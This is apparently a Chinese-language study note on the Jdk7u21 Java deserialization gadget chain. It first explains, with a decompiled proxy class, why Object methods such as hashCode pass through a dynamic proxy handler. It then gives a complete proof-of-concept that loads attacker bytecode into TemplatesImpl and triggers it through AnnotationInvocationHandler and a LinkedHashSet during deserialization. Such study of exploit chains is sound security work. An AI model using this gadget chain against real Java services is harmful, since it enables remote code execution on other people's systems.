# Jdk7u21

## 碰到的疑惑
1、为什么P神再动态代理的时候直接使用

```java
Templates proxy = (Templates) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);
```

再我一开始学动态代理的时候，简单的理解为只要实现了代理接口中的任意一个方法就会进行`handler#invoke`，但是再这里我查看了`Templates.class`没有找到hashcode方法！

于是我尝试了一下还成别的动态代理试试能否成功？

```java
Object o1 = Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]{Map.class}, tempHandler);
```

当然也成功了！！！于是在想这个动态代理到底是什么情况?

然后去看了一下[如何将动态代理类生成为可见的class文件](https://blog.csdn.net/flyfelu/article/details/118354250)。

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.sun.proxy;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.lang.reflect.UndeclaredThrowableException;
import java.util.Properties;
import javax.xml.transform.Templates;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerConfigurationException;

public final class $Proxy0 extends Proxy implements Templates {
    private static Method m1;
    private static Method m3;
    private static Method m4;
    private static Method m0;
    private static Method m2;

    public $Proxy0(InvocationHandler var1) throws  {
        super(var1);
    }

    public final boolean equals(Object var1) throws  {
        try {
            return (Boolean)super.h.invoke(this, m1, new Object[]{var1});
        } catch (RuntimeException | Error var3) {
            throw var3;
        } catch (Throwable var4) {
            throw new UndeclaredThrowableException(var4);
        }
    }

    public final Transformer newTransformer() throws TransformerConfigurationException {
        try {
            return (Transformer)super.h.invoke(this, m3, (Object[])null);
        } catch (RuntimeException | TransformerConfigurationException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    public final Properties getOutputProperties() throws  {
        try {
            return (Properties)super.h.invoke(this, m4, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    public final int hashCode() throws  {
        try {
            return (Integer)super.h.invoke(this, m0, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    public final String toString() throws  {
        try {
            return (String)super.h.invoke(this, m2, (Object[])null);
        } catch (RuntimeException | Error var2) {
            throw var2;
        } catch (Throwable var3) {
            throw new UndeclaredThrowableException(var3);
        }
    }

    static {
        try {
            m1 = Class.forName("java.lang.Object").getMethod("equals", Class.forName("java.lang.Object"));
            m3 = Class.forName("javax.xml.transform.Templates").getMethod("newTransformer");
            m4 = Class.forName("javax.xml.transform.Templates").getMethod("getOutputProperties");
            m0 = Class.forName("java.lang.Object").getMethod("hashCode");
            m2 = Class.forName("java.lang.Object").getMethod("toString");
        } catch (NoSuchMethodException var2) {
            throw new NoSuchMethodError(var2.getMessage());
        } catch (ClassNotFoundException var3) {
            throw new NoClassDefFoundError(var3.getMessage());
        }
    }
}

```

瞬间就恍然大悟了。这里也就是不能理解为只要实现了代理接口中的任意一个方法就会进行`handler#invoke`。其中还会默认再指定Object中的接口。

## poc

```java


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

public class Test {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{
                ClassPool.getDefault().get("EvilTemplatesImpl").toBytecode()
        });
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        // 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        // 实例化AnnotationInvocationHandler类
        Constructor handlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handlerConstructor.setAccessible(true);
        InvocationHandler tempHandler = (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);

        // 为tempHandler创造一层代理
        System.getProperties().put("jdk.proxy.ProxyGenerator.saveGeneratedFiles", "true");
        Templates proxy = (Templates) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]{Templates.class}, tempHandler);

//        Object o1 = Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]{Map.class}, tempHandler);


        // 实例化HashSet，并将两个对象放进去
        HashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        // 将恶意templates设置到map中
        map.put(zeroHashCodeStr, templates);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(set);
        oos.close();

        System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

